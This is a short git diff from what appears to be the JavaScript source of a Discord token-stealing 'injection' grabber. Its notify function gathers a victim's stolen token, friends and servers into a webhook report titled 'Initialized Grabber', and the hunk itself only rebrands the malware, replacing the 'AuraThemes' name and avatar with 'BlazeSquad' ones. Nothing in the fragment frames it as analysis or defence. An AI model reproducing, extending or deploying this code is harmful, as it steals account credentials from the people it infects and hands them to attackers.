@@ -146,8 +146,8 @@ const notify = async (ctx, token, acc) => {
         friends = await getFriends(token),
         servers = await getServers(token);
 
-    ctx.username = "@AuraThemes - Injection";
-    ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
+    ctx.username = "BlazeSquad - Injection";
+    ctx.avatar_url = "https://cdn.discordapp.com/attachments/1121402027369566262/1225003121563013120/demon.gif";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
     ctx.embeds[0].fields.unshift({
         name: `<a:aura:1087044506542674091> Token:`,
